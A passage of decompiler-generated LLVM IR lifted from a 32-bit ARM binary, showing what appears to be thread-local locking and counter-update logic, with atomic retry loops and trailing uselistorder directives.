  store i32 %v3_b5cc, i32* %r2.global-to-local, align 4
  %v0_b5d0 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5d0 = inttoptr i32 %v0_b5d0 to i32*
  %v2_b5d0 = load i32, i32* %v1_b5d0, align 4
  store i32 %v2_b5d0, i32* @r1, align 4
  %v1_b5d4 = add i32 %v0_b5cc, 8
  %v2_b5d4 = inttoptr i32 %v1_b5d4 to i32*
  %v3_b5d4 = load i32, i32* %v2_b5d4, align 4
  store i32 %v3_b5d4, i32* %r3.global-to-local, align 4
  %v1_b5d8 = and i32 %v3_b5cc, 8192
  %v2_b5d8 = icmp eq i32 %v1_b5d8, 0
  %v2_b5dc = add i32 %v0_b5cc, 20
  %v3_b5dc = inttoptr i32 %v2_b5dc to i32*
  store i32 %v3_b5d4, i32* %v3_b5dc, align 4
  %v0_b5e0 = load i32, i32* @r1, align 4
  %v1_b5e0 = load i32, i32* @r5, align 4
  %v2_b5e0 = add i32 %v1_b5e0, 52
  %v3_b5e0 = inttoptr i32 %v2_b5e0 to i32*
  store i32 %v0_b5e0, i32* %v3_b5e0, align 4
  %v0_b5e4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5e4 = load i32, i32* @r5, align 4
  %v2_b5e4 = add i32 %v1_b5e4, 24
  %v3_b5e4 = inttoptr i32 %v2_b5e4 to i32*
  store i32 %v0_b5e4, i32* %v3_b5e4, align 4
  %v0_b5e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_b5e8 = load i32, i32* @r5, align 4
  %v2_b5e8 = add i32 %v1_b5e8, 28
  %v3_b5e8 = inttoptr i32 %v2_b5e8 to i32*
  store i32 %v0_b5e8, i32* %v3_b5e8, align 4
  %v0_b5ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b5ec = load i32, i32* @r5, align 4
  %v2_b5ec = add i32 %v1_b5ec, 16
  %v3_b5ec = inttoptr i32 %v2_b5ec to i32*
  store i32 %v0_b5ec, i32* %v3_b5ec, align 4
  %v0_b5f0 = load i32, i32* %r4.global-to-local, align 4
  %v1_b5f0 = load i32, i32* @r5, align 4
  %v2_b5f0 = add i32 %v1_b5f0, 44
  %v3_b5f0 = inttoptr i32 %v2_b5f0 to i32*
  store i32 %v0_b5f0, i32* %v3_b5f0, align 4
  br i1 %v2_b5d8, label %dec_label_pc_b7d8, label %dec_label_pc_b5f8

dec_label_pc_b5f8:                                ; preds = %bb57
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b5fc = load i32, i32* @r8, align 4
  %v2_b5fc = add i32 %v0_b5fc, 168
  %v3_b5fc = inttoptr i32 %v2_b5fc to i32*
  %v4_b5fc = load i32, i32* %v3_b5fc, align 4
  store i32 %v4_b5fc, i32* %r7.global-to-local, align 4
  %v0_b600 = call i32 @__aeabi_read_tp()
  store i32 %v0_b600, i32* %r0.global-to-local, align 4
  %v1_b604 = add i32 %v4_b5fc, 8
  %v2_b604 = inttoptr i32 %v1_b604 to i32*
  %v3_b604 = load i32, i32* %v2_b604, align 4
  store i32 %v3_b604, i32* %r3.global-to-local, align 4
  %v1_b608 = add i32 %v0_b600, -1168
  store i32 %v1_b608, i32* %r6.global-to-local, align 4
  %v3_b60c = icmp uge i32 %v3_b604, %v1_b608
  store i1 %v3_b60c, i1* %cpsr_c.global-to-local, align 1
  %v9_b60c = icmp eq i32 %v3_b604, %v1_b608
  br i1 %v9_b60c, label %dec_label_pc_b650, label %dec_label_pc_b614

dec_label_pc_b614:                                ; preds = %dec_label_pc_b5f8
  store i32 %v4_b5fc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b61c

dec_label_pc_b61c:                                ; preds = %dec_label_pc_b628.dec_label_pc_b61c_crit_edge, %dec_label_pc_b614
  %v0_b61c = phi i32 [ %v0_b61c.pre, %dec_label_pc_b628.dec_label_pc_b61c_crit_edge ], [ %v4_b5fc, %dec_label_pc_b614 ]
  %v1_b61c = inttoptr i32 %v0_b61c to i32*
  %v2_b61c = load i32, i32* %v1_b61c, align 4
  store i32 %v2_b61c, i32* %r3.global-to-local, align 4
  %v1_b620 = load i32, i32* %r4.global-to-local, align 4
  %v3_b620 = icmp uge i32 %v2_b61c, %v1_b620
  store i1 %v3_b620, i1* %cpsr_c.global-to-local, align 1
  %v9_b620 = icmp eq i32 %v2_b61c, %v1_b620
  br i1 %v9_b620, label %dec_label_pc_b628, label %dec_label_pc_b640

dec_label_pc_b628:                                ; preds = %dec_label_pc_b61c
  store i32 %v2_b61c, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b638 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b638, label %dec_label_pc_b63c, label %dec_label_pc_b628.dec_label_pc_b61c_crit_edge

dec_label_pc_b628.dec_label_pc_b61c_crit_edge:    ; preds = %dec_label_pc_b628
  %v0_b61c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_b61c

dec_label_pc_b63c:                                ; preds = %dec_label_pc_b628
  %v0_b63c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b63c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b640

dec_label_pc_b640:                                ; preds = %dec_label_pc_b61c, %dec_label_pc_b63c
  %v0_b640 = phi i32 [ %v0_b63c, %dec_label_pc_b63c ], [ %v2_b61c, %dec_label_pc_b61c ]
  %v1_b640 = phi i32 [ %v0_b63c, %dec_label_pc_b63c ], [ %v1_b620, %dec_label_pc_b61c ]
  %v3_b640 = icmp uge i32 %v0_b640, %v1_b640
  store i1 %v3_b640, i1* %cpsr_c.global-to-local, align 1
  %v9_b640 = icmp eq i32 %v0_b640, %v1_b640
  br i1 %v9_b640, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_b640
  %v1_b644 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_b644, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_b640, %bb58
  %v1_b648 = xor i1 %v9_b640, true
  call void @__pseudo_cond_branch(i1 %v1_b648, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_b64c = load i32, i32* %r6.global-to-local, align 4
  %v1_b64c = load i32, i32* %r7.global-to-local, align 4
  %v2_b64c = add i32 %v1_b64c, 8
  %v3_b64c = inttoptr i32 %v2_b64c to i32*
  store i32 %v0_b64c, i32* %v3_b64c, align 4
  %v1_b66c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_b650

dec_label_pc_b650:                                ; preds = %dec_label_pc_b5f8, %bb59
  %v1_b66c = phi i32 [ %v3_b604, %dec_label_pc_b5f8 ], [ %v1_b66c.pre, %bb59 ]
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b654 = load i32, i32* @r8, align 4
  %v2_b654 = add i32 %v0_b654, 168
  %v3_b654 = inttoptr i32 %v2_b654 to i32*
  %v4_b654 = load i32, i32* %v3_b654, align 4
  store i32 160, i32* %r3.global-to-local, align 4
  %v2_b65c = add i32 %v0_b654, 160
  %v3_b65c = inttoptr i32 %v2_b65c to i32*
  %v4_b65c = load i32, i32* %v3_b65c, align 4
  store i32 %v4_b65c, i32* %r7.global-to-local, align 4
  %v1_b660 = add i32 %v4_b654, 4
  %v2_b660 = inttoptr i32 %v1_b660 to i32*
  %v3_b660 = load i32, i32* %v2_b660, align 4
  store i32 %v3_b660, i32* %r3.global-to-local, align 4
  %v1_b664 = add i32 %v4_b65c, 8
  %v2_b664 = inttoptr i32 %v1_b664 to i32*
  %v3_b664 = load i32, i32* %v2_b664, align 4
  store i32 %v3_b664, i32* %r2.global-to-local, align 4
  %v1_b668 = add i32 %v3_b660, 1
  store i32 %v1_b668, i32* %r3.global-to-local, align 4
  %v3_b66c = icmp uge i32 %v3_b664, %v1_b66c
  store i1 %v3_b66c, i1* %cpsr_c.global-to-local, align 1
  %v9_b66c = icmp eq i32 %v3_b664, %v1_b66c
  store i32 %v1_b668, i32* %v2_b660, align 4
  br i1 %v9_b66c, label %dec_label_pc_b6b8, label %dec_label_pc_b678

dec_label_pc_b678:                                ; preds = %dec_label_pc_b650
  %v0_b67c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b67c, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_b68495 = inttoptr i32 %v0_b67c to i32*
  %v2_b68496 = load i32, i32* %v1_b68495, align 4
  store i32 %v2_b68496, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_b68898 = icmp eq i32 %v2_b68496, 0
  br i1 %v9_b68898, label %dec_label_pc_b690, label %dec_label_pc_b6a8

dec_label_pc_b690:                                ; preds = %dec_label_pc_b678, %dec_label_pc_b690.dec_label_pc_b684_crit_edge
  %v0_b69099 = phi i32 [ %v1_b688.pre, %dec_label_pc_b690.dec_label_pc_b684_crit_edge ], [ 0, %dec_label_pc_b678 ]
  store i32 %v0_b69099, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b6a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b6a0, label %dec_label_pc_b6a4, label %dec_label_pc_b690.dec_label_pc_b684_crit_edge

dec_label_pc_b690.dec_label_pc_b684_crit_edge:    ; preds = %dec_label_pc_b690
  %v0_b684.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b688.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_b684 = inttoptr i32 %v0_b684.pre to i32*
  %v2_b684 = load i32, i32* %v1_b684, align 4
  store i32 %v2_b684, i32* %r3.global-to-local, align 4
  %v3_b688 = icmp uge i32 %v2_b684, %v1_b688.pre
  store i1 %v3_b688, i1* %cpsr_c.global-to-local, align 1
  %v9_b688 = icmp eq i32 %v2_b684, %v1_b688.pre
  br i1 %v9_b688, label %dec_label_pc_b690, label %dec_label_pc_b6a8

dec_label_pc_b6a4:                                ; preds = %dec_label_pc_b690
  %v0_b6a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b6a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b6a8

dec_label_pc_b6a8:                                ; preds = %dec_label_pc_b678, %dec_label_pc_b690.dec_label_pc_b684_crit_edge, %dec_label_pc_b6a4
  %v0_b6a8 = phi i32 [ %v0_b6a4, %dec_label_pc_b6a4 ], [ %v2_b68496, %dec_label_pc_b678 ], [ %v2_b684, %dec_label_pc_b690.dec_label_pc_b684_crit_edge ]
  %v1_b6a8 = phi i32 [ %v0_b6a4, %dec_label_pc_b6a4 ], [ 0, %dec_label_pc_b678 ], [ %v1_b688.pre, %dec_label_pc_b690.dec_label_pc_b684_crit_edge ]
  %v3_b6a8 = icmp uge i32 %v0_b6a8, %v1_b6a8
  store i1 %v3_b6a8, i1* %cpsr_c.global-to-local, align 1
  %v9_b6a8 = icmp eq i32 %v0_b6a8, %v1_b6a8
  br i1 %v9_b6a8, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_b6a8
  %v1_b6ac = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_b6ac, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_b6a8, %bb60
  %v1_b6b0 = xor i1 %v9_b6a8, true
  call void @__pseudo_cond_branch(i1 %v1_b6b0, i32 ptrtoint (i32* @global_var_10884.421 to i32))
  %v0_b6b4 = load i32, i32* %r6.global-to-local, align 4
  %v1_b6b4 = load i32, i32* %r7.global-to-local, align 4
  %v2_b6b4 = add i32 %v1_b6b4, 8
  %v3_b6b4 = inttoptr i32 %v2_b6b4 to i32*
  store i32 %v0_b6b4, i32* %v3_b6b4, align 4
  br label %dec_label_pc_b6b8

dec_label_pc_b6b8:                                ; preds = %dec_label_pc_b650, %bb61
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_b6bc = load i32, i32* @r8, align 4
  %v2_b6bc = add i32 %v0_b6bc, 160
  %v3_b6bc = inttoptr i32 %v2_b6bc to i32*
  %v4_b6bc = load i32, i32* %v3_b6bc, align 4
  store i32 %v4_b6bc, i32* %r0.global-to-local, align 4
  store i32 84, i32* %r3.global-to-local, align 4
  %v2_b6c4 = add i32 %v0_b6bc, 84
  %v3_b6c4 = inttoptr i32 %v2_b6c4 to i32*
  %v4_b6c4 = load i32, i32* %v3_b6c4, align 4
  store i32 %v4_b6c4, i32* @r1, align 4
  %v1_b6c8 = add i32 %v4_b6bc, 4
  %v2_b6c8 = inttoptr i32 %v1_b6c8 to i32*
  %v3_b6c8 = load i32, i32* %v2_b6c8, align 4
  store i32 %v3_b6c8, i32* %r3.global-to-local, align 4
  %v1_b6cc = inttoptr i32 %v4_b6c4 to i32*
  %v2_b6cc = load i32, i32* %v1_b6cc, align 4
  store i32 %v2_b6cc, i32* %r2.global-to-local, align 4
  %v1_b6d0 = add i32 %v3_b6c8, 1
  store i32 %v1_b6d0, i32* %r3.global-to-local, align 4
  store i32 %v1_b6d0, i32* %v2_b6c8, align 4
  %v0_b6d8 = load i32, i32* %r2.global-to-local, align 4
  %v1_b6d8 = load i32, i32* @r5, align 4
  %v2_b6d8 = add i32 %v1_b6d8, 32
  %v3_b6d8 = inttoptr i32 %v2_b6d8 to i32*
  store i32 %v0_b6d8, i32* %v3_b6d8, align 4
  %v0_b6dc = load i32, i32* %r0.global-to-local, align 4
  %v1_b6dc = add i32 %v0_b6dc, 4
  %v2_b6dc = inttoptr i32 %v1_b6dc to i32*
  %v3_b6dc = load i32, i32* %v2_b6dc, align 4
  %v1_b6e0 = add i32 %v3_b6dc, -1
  store i32 %v1_b6e0, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b6e4 = icmp eq i32 %v1_b6e0, 0
  %v0_b6e8 = load i32, i32* @r5, align 4
  %v1_b6e8 = load i32, i32* @r1, align 4
  %v2_b6e8 = inttoptr i32 %v1_b6e8 to i32*
  store i32 %v0_b6e8, i32* %v2_b6e8, align 4
  %v0_b6ec = load i32, i32* %r3.global-to-local, align 4
  %v1_b6ec = load i32, i32* %r0.global-to-local, align 4
  %v2_b6ec = add i32 %v1_b6ec, 4
  %v3_b6ec = inttoptr i32 %v2_b6ec to i32*
  store i32 %v0_b6ec, i32* %v3_b6ec, align 4
  br i1 %v2_b6e4, label %dec_label_pc_b6f4, label %dec_label_pc_b754

dec_label_pc_b6f4:                                ; preds = %dec_label_pc_b6b8
  %v0_b6f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_b6f4 = load i32, i32* %r0.global-to-local, align 4
  %v2_b6f4 = add i32 %v1_b6f4, 8
  %v3_b6f4 = inttoptr i32 %v2_b6f4 to i32*
  store i32 %v0_b6f4, i32* %v3_b6f4, align 4
  %v0_b6f8 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b6f8, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b6fc

dec_label_pc_b6fc:                                ; preds = %dec_label_pc_b72c.dec_label_pc_b6fc_crit_edge, %dec_label_pc_b6f4
  %v0_b6fc = phi i32 [ %v0_b6fc.pre, %dec_label_pc_b72c.dec_label_pc_b6fc_crit_edge ], [ %v0_b6f8, %dec_label_pc_b6f4 ]
  %v1_b6fc = inttoptr i32 %v0_b6fc to i32*
  %v2_b6fc = load i32, i32* %v1_b6fc, align 4
  store i32 %v2_b6fc, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_b6fc, i32* %r2.global-to-local, align 4
  %v2_b70883 = load i32, i32* %v1_b6fc, align 4
  store i32 %v2_b70883, i32* %r3.global-to-local, align 4
  %v3_b70c85 = icmp uge i32 %v2_b70883, %v2_b6fc
  store i1 %v3_b70c85, i1* %cpsr_c.global-to-local, align 1
  %v9_b70c91 = icmp eq i32 %v2_b70883, %v2_b6fc
  br i1 %v9_b70c91, label %dec_label_pc_b714, label %dec_label_pc_b72c

dec_label_pc_b714:                                ; preds = %dec_label_pc_b6fc, %dec_label_pc_b714.dec_label_pc_b708_crit_edge
  %v0_b71492 = phi i32 [ %v1_b70c.pre, %dec_label_pc_b714.dec_label_pc_b708_crit_edge ], [ %v2_b6fc, %dec_label_pc_b6fc ]
  store i32 %v0_b71492, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b724 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b724, label %dec_label_pc_b728, label %dec_label_pc_b714.dec_label_pc_b708_crit_edge

dec_label_pc_b714.dec_label_pc_b708_crit_edge:    ; preds = %dec_label_pc_b714
  %v0_b708.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b70c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_b708 = inttoptr i32 %v0_b708.pre to i32*
  %v2_b708 = load i32, i32* %v1_b708, align 4
  store i32 %v2_b708, i32* %r3.global-to-local, align 4
  %v3_b70c = icmp uge i32 %v2_b708, %v1_b70c.pre
  store i1 %v3_b70c, i1* %cpsr_c.global-to-local, align 1
  %v9_b70c = icmp eq i32 %v2_b708, %v1_b70c.pre
  br i1 %v9_b70c, label %dec_label_pc_b714, label %dec_label_pc_b72c

dec_label_pc_b728:                                ; preds = %dec_label_pc_b714
  %v0_b728 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b728, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b72c

dec_label_pc_b72c:                                ; preds = %dec_label_pc_b6fc, %dec_label_pc_b714.dec_label_pc_b708_crit_edge, %dec_label_pc_b728
  %v0_b734 = phi i32 [ %v0_b728, %dec_label_pc_b728 ], [ %v2_b70883, %dec_label_pc_b6fc ], [ %v2_b708, %dec_label_pc_b714.dec_label_pc_b708_crit_edge ]
  %v1_b72c = phi i32 [ %v0_b728, %dec_label_pc_b728 ], [ %v2_b6fc, %dec_label_pc_b6fc ], [ %v1_b70c.pre, %dec_label_pc_b714.dec_label_pc_b708_crit_edge ]
  %v3_b72c = icmp uge i32 %v0_b734, %v1_b72c
  store i1 %v3_b72c, i1* %cpsr_c.global-to-local, align 1
  %v9_b72c = icmp eq i32 %v0_b734, %v1_b72c
  br i1 %v9_b72c, label %dec_label_pc_b734, label %dec_label_pc_b72c.dec_label_pc_b6fc_crit_edge

dec_label_pc_b72c.dec_label_pc_b6fc_crit_edge:    ; preds = %dec_label_pc_b72c
  %v0_b6fc.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b6fc

dec_label_pc_b734:                                ; preds = %dec_label_pc_b72c
  %v2_b734 = icmp ne i32 %v1_b72c, 0
  store i1 %v2_b734, i1* %cpsr_c.global-to-local, align 1
  %v7_b738 = icmp slt i32 %v1_b72c, 2
  br i1 %v7_b738, label %dec_label_pc_b754, label %dec_label_pc_b73c

dec_label_pc_b73c:                                ; preds = %dec_label_pc_b734
  %v0_b73c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b73c, i32* %r0.global-to-local, align 4
  %v0_b740 = load i32, i32* @r1, align 4
  %v1_b740 = add i32 %v0_b740, 129
  store i32 %v1_b740, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b754

dec_label_pc_b754:                                ; preds = %dec_label_pc_b6b8, %dec_label_pc_b73c, %dec_label_pc_b734
  store i32 168, i32* %r3.global-to-local, align 4
  %v0_b758 = load i32, i32* @r8, align 4
  %v2_b758 = add i32 %v0_b758, 168
  %v3_b758 = inttoptr i32 %v2_b758 to i32*
  %v4_b758 = load i32, i32* %v3_b758, align 4
  store i32 %v4_b758, i32* %r0.global-to-local, align 4
  %v1_b75c = add i32 %v4_b758, 4
  %v2_b75c = inttoptr i32 %v1_b75c to i32*
  %v3_b75c = load i32, i32* %v2_b75c, align 4
  %v1_b760 = add i32 %v3_b75c, -1
  store i32 %v1_b760, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_b764 = icmp eq i32 %v1_b760, 0
  store i32 %v1_b760, i32* %v2_b75c, align 4
  br i1 %v2_b764, label %dec_label_pc_b770, label %dec_label_pc_b7d8

dec_label_pc_b770:                                ; preds = %dec_label_pc_b754
  %v0_b770 = load i32, i32* %r3.global-to-local, align 4
  %v1_b770 = load i32, i32* %r0.global-to-local, align 4
  %v2_b770 = add i32 %v1_b770, 8
  %v3_b770 = inttoptr i32 %v2_b770 to i32*
  store i32 %v0_b770, i32* %v3_b770, align 4
  %v0_b774 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_b774, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b778

dec_label_pc_b778:                                ; preds = %dec_label_pc_b7a8.dec_label_pc_b778_crit_edge, %dec_label_pc_b770
  %v0_b778 = phi i32 [ %v0_b778.pre, %dec_label_pc_b7a8.dec_label_pc_b778_crit_edge ], [ %v0_b774, %dec_label_pc_b770 ]
  %v1_b778 = inttoptr i32 %v0_b778 to i32*
  %v2_b778 = load i32, i32* %v1_b778, align 4
  store i32 %v2_b778, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_b778, i32* %r2.global-to-local, align 4
  %v2_b78471 = load i32, i32* %v1_b778, align 4
  store i32 %v2_b78471, i32* %r3.global-to-local, align 4
  %v3_b78873 = icmp uge i32 %v2_b78471, %v2_b778
  store i1 %v3_b78873, i1* %cpsr_c.global-to-local, align 1
  %v9_b78879 = icmp eq i32 %v2_b78471, %v2_b778
  br i1 %v9_b78879, label %dec_label_pc_b790, label %dec_label_pc_b7a8

dec_label_pc_b790:                                ; preds = %dec_label_pc_b778, %dec_label_pc_b790.dec_label_pc_b784_crit_edge
  %v0_b79080 = phi i32 [ %v1_b788.pre, %dec_label_pc_b790.dec_label_pc_b784_crit_edge ], [ %v2_b778, %dec_label_pc_b778 ]
  store i32 %v0_b79080, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_b7a0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_b7a0, label %dec_label_pc_b7a4, label %dec_label_pc_b790.dec_label_pc_b784_crit_edge

dec_label_pc_b790.dec_label_pc_b784_crit_edge:    ; preds = %dec_label_pc_b790
  %v0_b784.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_b788.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_b784 = inttoptr i32 %v0_b784.pre to i32*
  %v2_b784 = load i32, i32* %v1_b784, align 4
  store i32 %v2_b784, i32* %r3.global-to-local, align 4
  %v3_b788 = icmp uge i32 %v2_b784, %v1_b788.pre
  store i1 %v3_b788, i1* %cpsr_c.global-to-local, align 1
  %v9_b788 = icmp eq i32 %v2_b784, %v1_b788.pre
  br i1 %v9_b788, label %dec_label_pc_b790, label %dec_label_pc_b7a8

dec_label_pc_b7a4:                                ; preds = %dec_label_pc_b790
  %v0_b7a4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_b7a4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_b7a8

dec_label_pc_b7a8:                                ; preds = %dec_label_pc_b778, %dec_label_pc_b790.dec_label_pc_b784_crit_edge, %dec_label_pc_b7a4
  %v0_b7b0 = phi i32 [ %v0_b7a4, %dec_label_pc_b7a4 ], [ %v2_b78471, %dec_label_pc_b778 ], [ %v2_b784, %dec_label_pc_b790.dec_label_pc_b784_crit_edge ]
  %v1_b7a8 = phi i32 [ %v0_b7a4, %dec_label_pc_b7a4 ], [ %v2_b778, %dec_label_pc_b778 ], [ %v1_b788.pre, %dec_label_pc_b790.dec_label_pc_b784_crit_edge ]
  %v3_b7a8 = icmp uge i32 %v0_b7b0, %v1_b7a8
  store i1 %v3_b7a8, i1* %cpsr_c.global-to-local, align 1
  %v9_b7a8 = icmp eq i32 %v0_b7b0, %v1_b7a8
  br i1 %v9_b7a8, label %dec_label_pc_b7b0, label %dec_label_pc_b7a8.dec_label_pc_b778_crit_edge

dec_label_pc_b7a8.dec_label_pc_b778_crit_edge:    ; preds = %dec_label_pc_b7a8
  %v0_b778.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b778

dec_label_pc_b7b0:                                ; preds = %dec_label_pc_b7a8
  %v2_b7b0 = icmp ne i32 %v1_b7a8, 0
  store i1 %v2_b7b0, i1* %cpsr_c.global-to-local, align 1
  %v7_b7b4 = icmp slt i32 %v1_b7a8, 2
  br i1 %v7_b7b4, label %dec_label_pc_b7d8, label %dec_label_pc_b7b8

dec_label_pc_b7b8:                                ; preds = %dec_label_pc_b7b0
  %v0_b7b8 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_b7b8, i32* %r0.global-to-local, align 4
  %v0_b7bc = load i32, i32* @r1, align 4
  %v1_b7bc = add i32 %v0_b7bc, 129
  store i32 %v1_b7bc, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_b7d8

dec_label_pc_b7d4:                                ; preds = %dec_label_pc_b418, %dec_label_pc_b3fc, %dec_label_pc_b424
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_b7d8

dec_label_pc_b7d8:                                ; preds = %dec_label_pc_b754, %dec_label_pc_b7b0, %bb57, %dec_label_pc_b45c, %dec_label_pc_b7b8, %dec_label_pc_b7d4
  %v0_b7d8 = load i32, i32* @r5, align 4
  store i32 %v0_b7d8, i32* %r0.global-to-local, align 4
  %v2_b7e0 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_b7e0, i32* @r4, align 4
  store i32 %v6_b3bc, i32* @r5, align 4
  store i32 %v9_b3bc, i32* @r6, align 4
  store i32 %v12_b3bc, i32* @r7, align 4
  store i32 %v15_b3bc, i32* @r8, align 4
  ret i32 %v0_b7d8

; uselistorder directives
  uselistorder i32 %v0_b7a4, { 1, 0, 2 }
  uselistorder i32 %v1_b788.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b778, { 1, 0 }
  uselistorder i32 %v0_b728, { 1, 0, 2 }
  uselistorder i32 %v1_b70c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b6fc, { 1, 0 }
  uselistorder i32 %v0_b6a4, { 1, 0, 2 }
  uselistorder i32 %v1_b688.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_b63c, { 1, 0, 2 }
  uselistorder i32 %v1_b620, { 0, 2, 1 }
  uselistorder i32 %v4_b5fc, { 2, 1, 0, 3 }
  uselistorder i32 %v1_b5ac.pre, { 2, 1, 0 }
  uselistorder i32 %v0_b530, { 1, 2, 0 }
  uselistorder i32 %v1_b4c0, { 1, 0 }
  uselistorder i32 %v0_b4c0, { 1, 0 }
  uselistorder i32 %v1_b4a8, { 1, 2, 0, 3 }
  uselistorder i32 %v1_b44c, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 0, 2, 1, 3, 4, 6, 5, 7, 9, 8, 10, 11, 13, 12, 14 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5, 7, 6, 8, 9, 10, 11, 12, 13 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 52, 5, 6, 7, 8, 9, 11, 10, 53, 13, 12, 14, 15, 16, 17, 18, 19, 21, 20, 51, 22, 23, 24, 25, 26, 27, 28, 29, 30, 33, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 0, 49, 50 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 7, 8, 11, 9, 10, 12, 13, 14, 15, 16, 17, 19, 18, 20, 22, 21, 26, 23, 24, 25, 28, 27, 29, 30 }
  uselistorder i1* %cpsr_c.global-to-local, { 2, 3, 4, 36, 37, 5, 6, 7, 9, 8, 1, 10, 11, 13, 12, 0, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35 }
  uselistorder i8 97, { 1, 0 }
  uselistorder label %dec_label_pc_b7d8, { 5, 4, 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_b7d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b7a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b790, { 1, 0 }
  uselistorder label %dec_label_pc_b754, { 1, 2, 0 }
  uselistorder label %dec_label_pc_b72c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b714, { 1, 0 }
  uselistorder label %dec_label_pc_b6b8, { 1, 0 }
  uselistorder label %bb61, { 1, 0 }
  uselistorder label %dec_label_pc_b6a8, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b690, { 1, 0 }
  uselistorder label %dec_label_pc_b650, { 1, 0 }
  uselistorder label %bb59, { 1, 0 }
  uselistorder label %dec_label_pc_b640, { 1, 0 }
  uselistorder label %bb57, { 2, 0, 1 }
  uselistorder label %dec_label_pc_b588, { 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %bb55, { 1, 0 }
  uselistorder label %dec_label_pc_b4f0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_b498, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_b434, { 2, 1, 0 }
  uselistorder label %dec_label_pc_b3fc, { 1, 2, 0 }
}

define i32 @function_b7ec(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_b7ec:
  %v0_b7ec = load i1, i1* @cpsr_z, align 1
